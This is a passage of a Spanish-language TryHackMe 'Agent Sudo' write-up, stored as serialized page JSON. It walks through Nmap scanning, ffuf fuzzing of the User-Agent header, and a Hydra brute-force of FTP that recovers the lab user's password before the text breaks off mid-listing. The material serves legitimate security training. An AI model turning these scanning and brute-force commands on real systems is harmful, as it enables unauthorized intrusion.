[{"data":1,"prerenderedAt":1911},["Reactive",2],{"content-query-WCHxF5UbHK":3},{"_path":4,"_dir":5,"_draft":6,"_partial":6,"_locale":7,"title":8,"description":7,"published":9,"slug":10,"body":11,"_type":1905,"_id":1906,"_source":1907,"_file":1908,"_stem":1909,"_extension":1910},"/writeups/tryhackme-agent-sudo","writeups",false,"","TryHackMe | Agent Sudo","2025/05/30","tryhackme-agent-sudo",{"type":12,"children":13,"toc":1886},"root",[14,22,35,42,47,107,204,209,257,402,411,417,424,429,435,440,448,453,466,496,552,564,569,632,640,684,692,697,731,798,803,808,814,820,832,837,842,850,856,861,869,922,990,995,1058,1063,1139,1147,1152,1206,1212,1245,1260,1345,1412,1422,1446,1529,1547,1571,1577,1595,1624,1640,1663,1723,1728,1781,1793,1798,1813,1819,1824,1830,1834,1840,1844,1850,1854,1860,1870,1876,1880],{"type":15,"tag":16,"props":17,"children":21},"element","img",{"src":18,"width":19,"heigh":20},"/writeups/tryhackme-agent-sudo/thumbnail.png","200px","200px/",[],{"type":15,"tag":23,"props":24,"children":25},"p",{},[26],{"type":15,"tag":27,"props":28,"children":32},"a",{"href":29,"rel":30},"https://tryhackme.com/room/agentsudoctf",[31],"nofollow",[33],{"type":34,"value":29},"text",{"type":15,"tag":36,"props":37,"children":39},"h2",{"id":38},"escaneo",[40],{"type":34,"value":41},"Escaneo",{"type":15,"tag":23,"props":43,"children":44},{},[45],{"type":34,"value":46},"Escaneamos todos los puertos TCP de la maquina objetivo con Nmap.",{"type":15,"tag":48,"props":49,"children":53},"pre",{"className":50,"code":51,"language":52,"meta":7,"style":7},"language-bash shiki shiki-themes github-dark","sudo nmap -n -Pn -T4 10.10.195.209 -oN nmap.txt\n","bash",[54],{"type":15,"tag":55,"props":56,"children":57},"code",{"__ignoreMap":7},[58],{"type":15,"tag":59,"props":60,"children":63},"span",{"class":61,"line":62},"line",1,[64,70,76,82,87,92,97,102],{"type":15,"tag":59,"props":65,"children":67},{"style":66},"--shiki-default:#B392F0",[68],{"type":34,"value":69},"sudo",{"type":15,"tag":59,"props":71,"children":73},{"style":72},"--shiki-default:#9ECBFF",[74],{"type":34,"value":75}," nmap",{"type":15,"tag":59,"props":77,"children":79},{"style":78},"--shiki-default:#79B8FF",[80],{"type":34,"value":81}," -n",{"type":15,"tag":59,"props":83,"children":84},{"style":78},[85],{"type":34,"value":86}," -Pn",{"type":15,"tag":59,"props":88,"children":89},{"style":78},[90],{"type":34,"value":91}," -T4",{"type":15,"tag":59,"props":93,"children":94},{"style":78},[95],{"type":34,"value":96}," 10.10.195.209",{"type":15,"tag":59,"props":98,"children":99},{"style":78},[100],{"type":34,"value":101}," -oN",{"type":15,"tag":59,"props":103,"children":104},{"style":72},[105],{"type":34,"value":106}," nmap.txt\n",{"type":15,"tag":48,"props":108,"children":111},{"className":109,"code":110,"language":34,"meta":7,"style":7},"language-text shiki shiki-themes github-dark","sudo nmap -n -Pn -T4 10.10.195.209 -oN nmap.txt\n\n# Nmap 7.95 scan initiated Fri May 30 16:11:54 2025 as: /usr/lib/nmap/nmap -p- -n -Pn -T4 -oN nmap.txt 10.10.195.209\nNmap scan report for 10.10.195.209\nHost is up (0.27s latency).\nNot shown: 65532 closed tcp ports (reset)\nPORT   STATE SERVICE\n21/tcp open  ftp\n22/tcp open  ssh\n80/tcp open  http\n",[112],{"type":15,"tag":55,"props":113,"children":114},{"__ignoreMap":7},[115,122,132,141,150,159,168,177,186,195],{"type":15,"tag":59,"props":116,"children":117},{"class":61,"line":62},[118],{"type":15,"tag":59,"props":119,"children":120},{},[121],{"type":34,"value":51},{"type":15,"tag":59,"props":123,"children":125},{"class":61,"line":124},2,[126],{"type":15,"tag":59,"props":127,"children":129},{"emptyLinePlaceholder":128},true,[130],{"type":34,"value":131},"\n",{"type":15,"tag":59,"props":133,"children":135},{"class":61,"line":134},3,[136],{"type":15,"tag":59,"props":137,"children":138},{},[139],{"type":34,"value":140},"# Nmap 7.95 scan initiated Fri May 30 16:11:54 2025 as: /usr/lib/nmap/nmap -p- -n -Pn -T4 -oN nmap.txt 10.10.195.209\n",{"type":15,"tag":59,"props":142,"children":144},{"class":61,"line":143},4,[145],{"type":15,"tag":59,"props":146,"children":147},{},[148],{"type":34,"value":149},"Nmap scan report for 10.10.195.209\n",{"type":15,"tag":59,"props":151,"children":153},{"class":61,"line":152},5,[154],{"type":15,"tag":59,"props":155,"children":156},{},[157],{"type":34,"value":158},"Host is up (0.27s latency).\n",{"type":15,"tag":59,"props":160,"children":162},{"class":61,"line":161},6,[163],{"type":15,"tag":59,"props":164,"children":165},{},[166],{"type":34,"value":167},"Not shown: 65532 closed tcp ports (reset)\n",{"type":15,"tag":59,"props":169,"children":171},{"class":61,"line":170},7,[172],{"type":15,"tag":59,"props":173,"children":174},{},[175],{"type":34,"value":176},"PORT   STATE SERVICE\n",{"type":15,"tag":59,"props":178,"children":180},{"class":61,"line":179},8,[181],{"type":15,"tag":59,"props":182,"children":183},{},[184],{"type":34,"value":185},"21/tcp open  ftp\n",{"type":15,"tag":59,"props":187,"children":189},{"class":61,"line":188},9,[190],{"type":15,"tag":59,"props":191,"children":192},{},[193],{"type":34,"value":194},"22/tcp open  ssh\n",{"type":15,"tag":59,"props":196,"children":198},{"class":61,"line":197},10,[199],{"type":15,"tag":59,"props":200,"children":201},{},[202],{"type":34,"value":203},"80/tcp open  http\n",{"type":15,"tag":23,"props":205,"children":206},{},[207],{"type":34,"value":208},"Obtenemos informaci√≥n de los puertos abiertos.",{"type":15,"tag":48,"props":210,"children":212},{"className":50,"code":211,"language":52,"meta":7,"style":7},"sudo nmap -sCV -n -Pn -T4 10.10.195.209 -oN nmap-ports.txt\n",[213],{"type":15,"tag":55,"props":214,"children":215},{"__ignoreMap":7},[216],{"type":15,"tag":59,"props":217,"children":218},{"class":61,"line":62},[219,223,227,232,236,240,244,248,252],{"type":15,"tag":59,"props":220,"children":221},{"style":66},[222],{"type":34,"value":69},{"type":15,"tag":59,"props":224,"children":225},{"style":72},[226],{"type":34,"value":75},{"type":15,"tag":59,"props":228,"children":229},{"style":78},[230],{"type":34,"value":231}," -sCV",{"type":15,"tag":59,"props":233,"children":234},{"style":78},[235],{"type":34,"value":81},{"type":15,"tag":59,"props":237,"children":238},{"style":78},[239],{"type":34,"value":86},{"type":15,"tag":59,"props":241,"children":242},{"style":78},[243],{"type":34,"value":91},{"type":15,"tag":59,"props":245,"children":246},{"style":78},[247],{"type":34,"value":96},{"type":15,"tag":59,"props":249,"children":250},{"style":78},[251],{"type":34,"value":101},{"type":15,"tag":59,"props":253,"children":254},{"style":72},[255],{"type":34,"value":256}," nmap-ports.txt\n",{"type":15,"tag":48,"props":258,"children":260},{"className":109,"code":259,"language":34,"meta":7,"style":7},"sudo nmap -sCV -n -Pn -T4 10.10.195.209 -oN nmap-ports.txt\n\n# Nmap 7.95 scan initiated Fri May 30 16:25:00 2025 as: /usr/lib/nmap/nmap -sCV -p 21,22,80 -n -Pn -T4 -oN nmap-ports.txt 10.10.195.209\nNmap scan report for 10.10.195.209\nHost is up (0.27s latency).\n\nPORT   STATE SERVICE VERSION\n21/tcp open  ftp     vsftpd 3.0.3\n22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey:\n|   2048 ef:1f:5d:04:d4:77:95:06:60:72:ec:f0:58:f2:cc:07 (RSA)\n|   256 5e:02:d1:9a:c4:e7:43:06:62:c1:9e:25:84:8a:e7:ea (ECDSA)\n|_  256 2d:00:5c:b9:fd:a8:c8:d8:80:e3:92:4f:8b:4f:18:e2 (ED25519)\n80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))\n|_http-title: Annoucement\n|_http-server-header: Apache/2.4.29 (Ubuntu)\nService Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel\n",[261],{"type":15,"tag":55,"props":262,"children":263},{"__ignoreMap":7},[264,271,278,286,293,300,307,315,323,331,339,348,357,366,375,384,393],{"type":15,"tag":59,"props":265,"children":266},{"class":61,"line":62},[267],{"type":15,"tag":59,"props":268,"children":269},{},[270],{"type":34,"value":211},{"type":15,"tag":59,"props":272,"children":273},{"class":61,"line":124},[274],{"type":15,"tag":59,"props":275,"children":276},{"emptyLinePlaceholder":128},[277],{"type":34,"value":131},{"type":15,"tag":59,"props":279,"children":280},{"class":61,"line":134},[281],{"type":15,"tag":59,"props":282,"children":283},{},[284],{"type":34,"value":285},"# Nmap 7.95 scan initiated Fri May 30 16:25:00 2025 as: /usr/lib/nmap/nmap -sCV -p 21,22,80 -n -Pn -T4 -oN nmap-ports.txt 10.10.195.209\n",{"type":15,"tag":59,"props":287,"children":288},{"class":61,"line":143},[289],{"type":15,"tag":59,"props":290,"children":291},{},[292],{"type":34,"value":149},{"type":15,"tag":59,"props":294,"children":295},{"class":61,"line":152},[296],{"type":15,"tag":59,"props":297,"children":298},{},[299],{"type":34,"value":158},{"type":15,"tag":59,"props":301,"children":302},{"class":61,"line":161},[303],{"type":15,"tag":59,"props":304,"children":305},{"emptyLinePlaceholder":128},[306],{"type":34,"value":131},{"type":15,"tag":59,"props":308,"children":309},{"class":61,"line":170},[310],{"type":15,"tag":59,"props":311,"children":312},{},[313],{"type":34,"value":314},"PORT   STATE SERVICE VERSION\n",{"type":15,"tag":59,"props":316,"children":317},{"class":61,"line":179},[318],{"type":15,"tag":59,"props":319,"children":320},{},[321],{"type":34,"value":322},"21/tcp open  ftp     vsftpd 3.0.3\n",{"type":15,"tag":59,"props":324,"children":325},{"class":61,"line":188},[326],{"type":15,"tag":59,"props":327,"children":328},{},[329],{"type":34,"value":330},"22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\n",{"type":15,"tag":59,"props":332,"children":333},{"class":61,"line":197},[334],{"type":15,"tag":59,"props":335,"children":336},{},[337],{"type":34,"value":338},"| ssh-hostkey:\n",{"type":15,"tag":59,"props":340,"children":342},{"class":61,"line":341},11,[343],{"type":15,"tag":59,"props":344,"children":345},{},[346],{"type":34,"value":347},"|   2048 ef:1f:5d:04:d4:77:95:06:60:72:ec:f0:58:f2:cc:07 (RSA)\n",{"type":15,"tag":59,"props":349,"children":351},{"class":61,"line":350},12,[352],{"type":15,"tag":59,"props":353,"children":354},{},[355],{"type":34,"value":356},"|   256 5e:02:d1:9a:c4:e7:43:06:62:c1:9e:25:84:8a:e7:ea (ECDSA)\n",{"type":15,"tag":59,"props":358,"children":360},{"class":61,"line":359},13,[361],{"type":15,"tag":59,"props":362,"children":363},{},[364],{"type":34,"value":365},"|_  256 2d:00:5c:b9:fd:a8:c8:d8:80:e3:92:4f:8b:4f:18:e2 (ED25519)\n",{"type":15,"tag":59,"props":367,"children":369},{"class":61,"line":368},14,[370],{"type":15,"tag":59,"props":371,"children":372},{},[373],{"type":34,"value":374},"80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))\n",{"type":15,"tag":59,"props":376,"children":378},{"class":61,"line":377},15,[379],{"type":15,"tag":59,"props":380,"children":381},{},[382],{"type":34,"value":383},"|_http-title: Annoucement\n",{"type":15,"tag":59,"props":385,"children":387},{"class":61,"line":386},16,[388],{"type":15,"tag":59,"props":389,"children":390},{},[391],{"type":34,"value":392},"|_http-server-header: Apache/2.4.29 (Ubuntu)\n",{"type":15,"tag":59,"props":394,"children":396},{"class":61,"line":395},17,[397],{"type":15,"tag":59,"props":398,"children":399},{},[400],{"type":34,"value":401},"Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel\n",{"type":15,"tag":403,"props":404,"children":405},"blockquote",{},[406],{"type":15,"tag":23,"props":407,"children":408},{},[409],{"type":34,"value":410},"Para agilizar el proceso de escaneo y enumeraci√≥n, primero encontramos puertos abiertos y luego los escaneamos en busca de banners, versiones y otra informaci√≥n util.",{"type":15,"tag":36,"props":412,"children":414},{"id":413},"enumeraci√≥n-de-servicios",[415],{"type":34,"value":416},"Enumeraci√≥n de servicios",{"type":15,"tag":418,"props":419,"children":421},"h3",{"id":420},"tcp21",[422],{"type":34,"value":423},"TCP/21",{"type":15,"tag":23,"props":425,"children":426},{},[427],{"type":34,"value":428},"No es posible realizar un inicio de sesi√≥n an√≥nimo en el servicio FTP. Por lo que tendremos que revisitar este puerto mas adelante.",{"type":15,"tag":418,"props":430,"children":432},{"id":431},"tcp80",[433],{"type":34,"value":434},"TCP/80",{"type":15,"tag":23,"props":436,"children":437},{},[438],{"type":34,"value":439},"Se nos da la bienvenida con un mensaje cr√≠ptico.",{"type":15,"tag":23,"props":441,"children":442},{},[443],{"type":15,"tag":16,"props":444,"children":447},{"alt":445,"src":446},"image-1","/writeups/tryhackme-agent-sudo/image-1.png",[],{"type":15,"tag":23,"props":449,"children":450},{},[451],{"type":34,"value":452},"\"user-agent\" se refiere a la cabecera HTTP \"User-Agent\", por lo que debemos de cambiarla para poder acceder. ¬øPero que \"c√≥digo nombre\" debemos utilizar? Puesto que el mensaje fue firmado por Agent R, podemos intuir que nuestro c√≥digo nombre corresponde a alguna de las letras del abecedario.",{"type":15,"tag":23,"props":454,"children":455},{},[456,458,464],{"type":34,"value":457},"Creamos una lista de palabras con todas las letras del abecedario en may√∫scula haciendo uso de ",{"type":15,"tag":459,"props":460,"children":461},"strong",{},[462],{"type":34,"value":463},"TTPassGen",{"type":34,"value":465},".",{"type":15,"tag":48,"props":467,"children":469},{"className":50,"code":468,"language":52,"meta":7,"style":7},"ttpassgen -r \"[?u]{1:1}\" wordlist.txt\n",[470],{"type":15,"tag":55,"props":471,"children":472},{"__ignoreMap":7},[473],{"type":15,"tag":59,"props":474,"children":475},{"class":61,"line":62},[476,481,486,491],{"type":15,"tag":59,"props":477,"children":478},{"style":66},[479],{"type":34,"value":480},"ttpassgen",{"type":15,"tag":59,"props":482,"children":483},{"style":78},[484],{"type":34,"value":485}," -r",{"type":15,"tag":59,"props":487,"children":488},{"style":72},[489],{"type":34,"value":490}," \"[?u]{1:1}\"",{"type":15,"tag":59,"props":492,"children":493},{"style":72},[494],{"type":34,"value":495}," wordlist.txt\n",{"type":15,"tag":48,"props":497,"children":500},{"className":109,"code":498,"filename":499,"language":34,"meta":7,"style":7},"A\nB\nC\n\u003CSNIP>\nY\nZ\n","wordlist.txt",[501],{"type":15,"tag":55,"props":502,"children":503},{"__ignoreMap":7},[504,512,520,528,536,544],{"type":15,"tag":59,"props":505,"children":506},{"class":61,"line":62},[507],{"type":15,"tag":59,"props":508,"children":509},{},[510],{"type":34,"value":511},"A\n",{"type":15,"tag":59,"props":513,"children":514},{"class":61,"line":124},[515],{"type":15,"tag":59,"props":516,"children":517},{},[518],{"type":34,"value":519},"B\n",{"type":15,"tag":59,"props":521,"children":522},{"class":61,"line":134},[523],{"type":15,"tag":59,"props":524,"children":525},{},[526],{"type":34,"value":527},"C\n",{"type":15,"tag":59,"props":529,"children":530},{"class":61,"line":143},[531],{"type":15,"tag":59,"props":532,"children":533},{},[534],{"type":34,"value":535},"\u003CSNIP>\n",{"type":15,"tag":59,"props":537,"children":538},{"class":61,"line":152},[539],{"type":15,"tag":59,"props":540,"children":541},{},[542],{"type":34,"value":543},"Y\n",{"type":15,"tag":59,"props":545,"children":546},{"class":61,"line":161},[547],{"type":15,"tag":59,"props":548,"children":549},{},[550],{"type":34,"value":551},"Z\n",{"type":15,"tag":23,"props":553,"children":554},{},[555,557,562],{"type":34,"value":556},"Enviamos solicitudes con ",{"type":15,"tag":459,"props":558,"children":559},{},[560],{"type":34,"value":561},"ffuf",{"type":34,"value":563},". Puesto que la lista de palabras es corta, y no sabemos exactamente que esperar de una respuesta adecuada, podemos optar por no filtrar las respuestas y examinarlas manualmente. Sin embargo, tambi√©n podemos suponer que una respuesta adecuada contendr√° un c√≥digo de respuesta diferente a 200 o tendr√° un tama√±o diferente al usual (218 bytes).",{"type":15,"tag":23,"props":565,"children":566},{},[567],{"type":34,"value":568},"Para prop√≥sitos educativos, elegiremos seguir las redirecciones y filtrar las respuestas basadas en su tama√±o.",{"type":15,"tag":48,"props":570,"children":572},{"className":50,"code":571,"language":52,"meta":7,"style":7},"ffuf -u http://10.10.195.209 -H \"User-Agent: FUZZ\" -w wordlist.txt -c -r -fs 218\n",[573],{"type":15,"tag":55,"props":574,"children":575},{"__ignoreMap":7},[576],{"type":15,"tag":59,"props":577,"children":578},{"class":61,"line":62},[579,583,588,593,598,603,608,613,618,622,627],{"type":15,"tag":59,"props":580,"children":581},{"style":66},[582],{"type":34,"value":561},{"type":15,"tag":59,"props":584,"children":585},{"style":78},[586],{"type":34,"value":587}," -u",{"type":15,"tag":59,"props":589,"children":590},{"style":72},[591],{"type":34,"value":592}," http://10.10.195.209",{"type":15,"tag":59,"props":594,"children":595},{"style":78},[596],{"type":34,"value":597}," -H",{"type":15,"tag":59,"props":599,"children":600},{"style":72},[601],{"type":34,"value":602}," \"User-Agent: FUZZ\"",{"type":15,"tag":59,"props":604,"children":605},{"style":78},[606],{"type":34,"value":607}," -w",{"type":15,"tag":59,"props":609,"children":610},{"style":72},[611],{"type":34,"value":612}," wordlist.txt",{"type":15,"tag":59,"props":614,"children":615},{"style":78},[616],{"type":34,"value":617}," -c",{"type":15,"tag":59,"props":619,"children":620},{"style":78},[621],{"type":34,"value":485},{"type":15,"tag":59,"props":623,"children":624},{"style":78},[625],{"type":34,"value":626}," -fs",{"type":15,"tag":59,"props":628,"children":629},{"style":78},[630],{"type":34,"value":631}," 218\n",{"type":15,"tag":403,"props":633,"children":634},{},[635],{"type":15,"tag":23,"props":636,"children":637},{},[638],{"type":34,"value":639},"¬øFiltrar por c√≥digo de respuesta o por tama√±o? Filtrar por c√≥digo de respuesta nos puede llevar a omitir respuestas no est√°ndares, por lo que seguiremos la redirecciones y filtraremos por tama√±o de respuesta.",{"type":15,"tag":48,"props":641,"children":643},{"className":109,"code":642,"language":34,"meta":7,"style":7},"ffuf -u http://10.10.195.209 -H \"User-Agent: FUZZ\" -w wordlist.txt -c -r -fs 218\n\n\u003CSNIP>\nR                       [Status: 200, Size: 310, Words: 31, Lines: 19, Duration: 267ms]\nC                       [Status: 200, Size: 177, Words: 27, Lines: 8, Duration: 267ms]\n",[644],{"type":15,"tag":55,"props":645,"children":646},{"__ignoreMap":7},[647,654,661,668,676],{"type":15,"tag":59,"props":648,"children":649},{"class":61,"line":62},[650],{"type":15,"tag":59,"props":651,"children":652},{},[653],{"type":34,"value":571},{"type":15,"tag":59,"props":655,"children":656},{"class":61,"line":124},[657],{"type":15,"tag":59,"props":658,"children":659},{"emptyLinePlaceholder":128},[660],{"type":34,"value":131},{"type":15,"tag":59,"props":662,"children":663},{"class":61,"line":134},[664],{"type":15,"tag":59,"props":665,"children":666},{},[667],{"type":34,"value":535},{"type":15,"tag":59,"props":669,"children":670},{"class":61,"line":143},[671],{"type":15,"tag":59,"props":672,"children":673},{},[674],{"type":34,"value":675},"R                       [Status: 200, Size: 310, Words: 31, Lines: 19, Duration: 267ms]\n",{"type":15,"tag":59,"props":677,"children":678},{"class":61,"line":152},[679],{"type":15,"tag":59,"props":680,"children":681},{},[682],{"type":34,"value":683},"C                       [Status: 200, Size: 177, Words: 27, Lines: 8, Duration: 267ms]\n",{"type":15,"tag":403,"props":685,"children":686},{},[687],{"type":15,"tag":23,"props":688,"children":689},{},[690],{"type":34,"value":691},"La letra C originalmente nos redirige a otra pagina, mientras que la letra R nos muestra otro mensaje. Si hubi√©ramos filtrado todas las respuestas con c√≥digo 200, hubi√©ramos omitido esta ultima respuesta.",{"type":15,"tag":23,"props":693,"children":694},{},[695],{"type":34,"value":696},"Al enviar una petici√≥n con el User-Agent \"R\", obtenemos una respuesta ligeramente diferente a la original (pero sin importancia). La letra \"C\" nos revela una respuesta completamente diferente.",{"type":15,"tag":48,"props":698,"children":700},{"className":50,"code":699,"language":52,"meta":7,"style":7},"curl -sL -H \"User-Agent: C\" http://10.10.195.209/\n",[701],{"type":15,"tag":55,"props":702,"children":703},{"__ignoreMap":7},[704],{"type":15,"tag":59,"props":705,"children":706},{"class":61,"line":62},[707,712,717,721,726],{"type":15,"tag":59,"props":708,"children":709},{"style":66},[710],{"type":34,"value":711},"curl",{"type":15,"tag":59,"props":713,"children":714},{"style":78},[715],{"type":34,"value":716}," -sL",{"type":15,"tag":59,"props":718,"children":719},{"style":78},[720],{"type":34,"value":597},{"type":15,"tag":59,"props":722,"children":723},{"style":72},[724],{"type":34,"value":725}," \"User-Agent: C\"",{"type":15,"tag":59,"props":727,"children":728},{"style":72},[729],{"type":34,"value":730}," http://10.10.195.209/\n",{"type":15,"tag":48,"props":732,"children":734},{"className":109,"code":733,"language":34,"meta":7,"style":7},"curl -sL -H \"User-Agent: C\" http://10.10.195.209/\n\nAttention chris, \u003Cbr>\u003Cbr>\n\nDo you still remember our deal? Please tell agent J about the stuff ASAP. Also, change your god damn password, is weak! \u003Cbr>\u003Cbr>\n\nFrom,\u003Cbr>\nAgent R\n",[735],{"type":15,"tag":55,"props":736,"children":737},{"__ignoreMap":7},[738,745,752,760,767,775,782,790],{"type":15,"tag":59,"props":739,"children":740},{"class":61,"line":62},[741],{"type":15,"tag":59,"props":742,"children":743},{},[744],{"type":34,"value":699},{"type":15,"tag":59,"props":746,"children":747},{"class":61,"line":124},[748],{"type":15,"tag":59,"props":749,"children":750},{"emptyLinePlaceholder":128},[751],{"type":34,"value":131},{"type":15,"tag":59,"props":753,"children":754},{"class":61,"line":134},[755],{"type":15,"tag":59,"props":756,"children":757},{},[758],{"type":34,"value":759},"Attention chris, \u003Cbr>\u003Cbr>\n",{"type":15,"tag":59,"props":761,"children":762},{"class":61,"line":143},[763],{"type":15,"tag":59,"props":764,"children":765},{"emptyLinePlaceholder":128},[766],{"type":34,"value":131},{"type":15,"tag":59,"props":768,"children":769},{"class":61,"line":152},[770],{"type":15,"tag":59,"props":771,"children":772},{},[773],{"type":34,"value":774},"Do you still remember our deal? Please tell agent J about the stuff ASAP. Also, change your god damn password, is weak! \u003Cbr>\u003Cbr>\n",{"type":15,"tag":59,"props":776,"children":777},{"class":61,"line":161},[778],{"type":15,"tag":59,"props":779,"children":780},{"emptyLinePlaceholder":128},[781],{"type":34,"value":131},{"type":15,"tag":59,"props":783,"children":784},{"class":61,"line":170},[785],{"type":15,"tag":59,"props":786,"children":787},{},[788],{"type":34,"value":789},"From,\u003Cbr>\n",{"type":15,"tag":59,"props":791,"children":792},{"class":61,"line":179},[793],{"type":15,"tag":59,"props":794,"children":795},{},[796],{"type":34,"value":797},"Agent R\n",{"type":15,"tag":23,"props":799,"children":800},{},[801],{"type":34,"value":802},"Descubrimos el nombre de usuario \"chris\" y que su contrase√±a es d√©bil.",{"type":15,"tag":23,"props":804,"children":805},{},[806],{"type":34,"value":807},"Si intentamos enumerar directorios y paginas web, tales como formularios de inicio de sesi√≥n, no obtendremos resultados.",{"type":15,"tag":36,"props":809,"children":811},{"id":810},"explotaci√≥n",[812],{"type":34,"value":813},"Explotaci√≥n",{"type":15,"tag":418,"props":815,"children":817},{"id":816},"ssh",[818],{"type":34,"value":819},"SSH",{"type":15,"tag":23,"props":821,"children":822},{},[823,825,830],{"type":34,"value":824},"Al no encontrar un vector de explotaci√≥n evidente, usaremos ",{"type":15,"tag":459,"props":826,"children":827},{},[828],{"type":34,"value":829},"hydra",{"type":34,"value":831}," para obtener la contrase√±a del servicio SSH mediante fuerza bruta.",{"type":15,"tag":23,"props":833,"children":834},{},[835],{"type":34,"value":836},"Iniciar sesi√≥n en este servicio corresponde al camino hacia el √©xito mas directo, por tanto tiene sentido probar un ataque de fuerza bruta primero con este servicio. Pero en un entorno real este servicio estar√° fuertemente protegido y monitorizado, por lo que deber√≠amos de probar en otros lugares primero.",{"type":15,"tag":23,"props":838,"children":839},{},[840],{"type":34,"value":841},"Finalmente, este ataque falla en obtener una contrase√±a valida en un intervalo de tiempo aceptable.",{"type":15,"tag":403,"props":843,"children":844},{},[845],{"type":15,"tag":23,"props":846,"children":847},{},[848],{"type":34,"value":849},"Nunca debes realizar un ataque de fuerza bruta, a menos que sea el √∫nico camino disponible o hayan grandes indicios de que este es el camino correcto.",{"type":15,"tag":418,"props":851,"children":853},{"id":852},"ftp",[854],{"type":34,"value":855},"FTP",{"type":15,"tag":23,"props":857,"children":858},{},[859],{"type":34,"value":860},"Al fallar el anterior ataque, esta vez lo intentaremos en el servicio FTP.",{"type":15,"tag":403,"props":862,"children":863},{},[864],{"type":15,"tag":23,"props":865,"children":866},{},[867],{"type":34,"value":868},"Si hay indicios de que una contrase√±a es d√©bil, vale la pena usar listas de palabras conocidas como rockyou.txt (Solo en CTFs).",{"type":15,"tag":48,"props":870,"children":872},{"className":50,"code":871,"language":52,"meta":7,"style":7},"hydra -l \"chris\" -P /usr/share/wordlists/rockyou.txt -f -vV 10.10.195.209 ftp\n",[873],{"type":15,"tag":55,"props":874,"children":875},{"__ignoreMap":7},[876],{"type":15,"tag":59,"props":877,"children":878},{"class":61,"line":62},[879,883,888,893,898,903,908,913,917],{"type":15,"tag":59,"props":880,"children":881},{"style":66},[882],{"type":34,"value":829},{"type":15,"tag":59,"props":884,"children":885},{"style":78},[886],{"type":34,"value":887}," -l",{"type":15,"tag":59,"props":889,"children":890},{"style":72},[891],{"type":34,"value":892}," \"chris\"",{"type":15,"tag":59,"props":894,"children":895},{"style":78},[896],{"type":34,"value":897}," -P",{"type":15,"tag":59,"props":899,"children":900},{"style":72},[901],{"type":34,"value":902}," /usr/share/wordlists/rockyou.txt",{"type":15,"tag":59,"props":904,"children":905},{"style":78},[906],{"type":34,"value":907}," -f",{"type":15,"tag":59,"props":909,"children":910},{"style":78},[911],{"type":34,"value":912}," -vV",{"type":15,"tag":59,"props":914,"children":915},{"style":78},[916],{"type":34,"value":96},{"type":15,"tag":59,"props":918,"children":919},{"style":72},[920],{"type":34,"value":921}," ftp\n",{"type":15,"tag":48,"props":923,"children":925},{"className":109,"code":924,"language":34,"meta":7,"style":7},"hydra -l \"chris\" -P /usr/share/wordlists/rockyou.txt -f -vV 10.10.195.209 ftp\n\n\u003CSNIP>\n[ATTEMPT] target 10.10.195.209 - login \"chris\" - pass \"freedom\" - 256 of 14344399 [child 9] (0/0)\n[21][ftp] host: 10.10.195.209   login: chris   password: crystal\n[STATUS] attack finished for 10.10.195.209 (valid pair found)\n1 of 1 target successfully completed, 1 valid password found\nHydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-05-30 20:05:43\n",[926],{"type":15,"tag":55,"props":927,"children":928},{"__ignoreMap":7},[929,936,943,950,958,966,974,982],{"type":15,"tag":59,"props":930,"children":931},{"class":61,"line":62},[932],{"type":15,"tag":59,"props":933,"children":934},{},[935],{"type":34,"value":871},{"type":15,"tag":59,"props":937,"children":938},{"class":61,"line":124},[939],{"type":15,"tag":59,"props":940,"children":941},{"emptyLinePlaceholder":128},[942],{"type":34,"value":131},{"type":15,"tag":59,"props":944,"children":945},{"class":61,"line":134},[946],{"type":15,"tag":59,"props":947,"children":948},{},[949],{"type":34,"value":535},{"type":15,"tag":59,"props":951,"children":952},{"class":61,"line":143},[953],{"type":15,"tag":59,"props":954,"children":955},{},[956],{"type":34,"value":957},"[ATTEMPT] target 10.10.195.209 - login \"chris\" - pass \"freedom\" - 256 of 14344399 [child 9] (0/0)\n",{"type":15,"tag":59,"props":959,"children":960},{"class":61,"line":152},[961],{"type":15,"tag":59,"props":962,"children":963},{},[964],{"type":34,"value":965},"[21][ftp] host: 10.10.195.209   login: chris   password: crystal\n",{"type":15,"tag":59,"props":967,"children":968},{"class":61,"line":161},[969],{"type":15,"tag":59,"props":970,"children":971},{},[972],{"type":34,"value":973},"[STATUS] attack finished for 10.10.195.209 (valid pair found)\n",{"type":15,"tag":59,"props":975,"children":976},{"class":61,"line":170},[977],{"type":15,"tag":59,"props":978,"children":979},{},[980],{"type":34,"value":981},"1 of 1 target successfully completed, 1 valid password found\n",{"type":15,"tag":59,"props":983,"children":984},{"class":61,"line":179},[985],{"type":15,"tag":59,"props":986,"children":987},{},[988],{"type":34,"value":989},"Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-05-30 20:05:43\n",{"type":15,"tag":23,"props":991,"children":992},{},[993],{"type":34,"value":994},"Ingresamos al servidor FTP con las anteriores credenciales y listamos los archivos.",{"type":15,"tag":48,"props":996,"children":998},{"className":109,"code":997,"language":34,"meta":7,"style":7},"ftp> ls\n229 Entering Extended Passive Mode (|||6987|)\n150 Here comes the directory listing.\n-rw-r--r--    1 0        0             217 Oct 29  2019 To_agentJ.txt\n-rw-r--r--    1 0        0           33143 Oct 29  2019 cute-alien.jpg\n-rw-r--r--    1 0        0           34842 Oct 29  2019 cutie.png\n226 Directory send OK.\n",[999],{"type":15,"tag":55,"props":1000,"children":1001},{"__ignoreMap":7},[1002,1010,1018,1026,1034,1042,1050],{"type":15,"tag":59,"props":1003,"children":1004},{"class":61,"line":62},[1005],{"type":15,"tag":59,"props":1006,"children":1007},{},[1008],{"type":34,"value":1009},"ftp> ls\n",{"type":15,"tag":59,"props":1011,"children":1012},{"class":61,"line":124},[1013],{"type":15,"tag":59,"props":1014,"children":1015},{},[1016],{"type":34,"value":1017},"229 Entering Extended Passive Mode (|||6987|)\n",{"type":15,"tag":59,"props":1019,"children":1020},{"class":61,"line":134},[1021],{"type":15,"tag":59,"props":1022,"children":1023},{},[1024],{"type":34,"value":1025},"150 Here comes the directory listing.\n",{"type":15,"tag":59,"props":1027,"children":1028},{"class":61,"line":143},[1029],{"type":15,"tag":59,"props":1030,"children":1031},{},[1032],{"type":34,"value":1033},"-rw-r--r--    1 0        0             217 Oct 29  2019 